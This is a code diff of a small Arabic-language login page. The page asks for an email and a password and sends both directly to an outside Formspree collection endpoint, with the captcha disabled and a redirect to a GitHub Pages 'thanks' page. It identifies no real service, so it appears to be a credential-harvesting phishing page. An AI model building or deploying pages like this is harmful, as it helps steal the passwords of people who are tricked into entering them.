@@ -5,56 +5,32 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>صفحة التسجيل</title>
     <style>
-        /* هذا هو تصميمك الذي حافظنا عليه */
         body { font-family: sans-serif; background: #eef2f3; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .box { background: white; padding: 30px; border-radius: 15px; shadow: 0 5px 15px rgba(0,0,0,0.1); width: 300px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
-        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; }
-        button { width: 100%; padding: 10px; background: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; }
+        .box { background: white; padding: 30px; border-radius: 15px; width: 300px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); text-align: center; }
+        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; }
+        button { width: 100%; padding: 12px; background: #007bff; color: white; border: none; border-radius: 8px; cursor: pointer; font-size: 16px; font-weight: bold; }
         button:hover { background: #0056b3; }
-        label { font-size: 14px; color: #333; }
+        label { font-size: 14px; color: #333; display: block; text-align: right; }
     </style>
 </head>
 <body>
 
     <div class="box">
-        <form id="my-form" action="https://formspree.io/f/xgozqzbw" method="POST">
+        <form action="https://formspree.io/f/xgozqzbw" method="POST">
+            
             <label>البريد الإلكتروني:</label>
-            <input type="text" name="Email" required>
+            <input type="text" name="email" required placeholder="أدخل بريدك">
             
             <label>كلمة السر:</label>
-            <input type="password" name="Password" required>
+            <input type="password" name="password" required placeholder="أدخل كلمة السر">
 
-            <button type="submit" id="submit-btn">تسجيل</button>
+            <input type="hidden" name="_next" value="https://alymaanythlkm.github.io/999/thanks.html">
+            
+            <input type="hidden" name="_captcha" value="false">
+
+            <button type="submit">تسجيل الدخول</button>
         </form>
     </div>
 
-    <script>
-        var form = document.getElementById("my-form");
-        
-        form.onsubmit = function(event) {
-          event.preventDefault(); 
-          var btn = document.getElementById("submit-btn");
-          btn.disabled = true;
-          btn.innerText = "جاري الإرسال...";
-
-          var data = new FormData(form);
-          var xhr = new XMLHttpRequest();
-          xhr.open(form.method, form.action);
-          xhr.setRequestHeader("Accept", "application/json");
-          
-          xhr.onreadystatechange = function() {
-            if (xhr.readyState !== XMLHttpRequest.DONE) return;
-            if (xhr.status === 200) {
-              // التوجيه لصفحة الشكر الخاصة بك في مستودع 999
-              window.location.href = "https://alymaanythlkm.github.io/999/thanks.html";
-            } else {
-              btn.disabled = false;
-              btn.innerText = "تسجيل";
-              alert("حدث خطأ، تأكد من اتصال الإنترنت");
-            }
-          };
-          xhr.send(data);
-        };
-    </script>
 </body>
 </html>
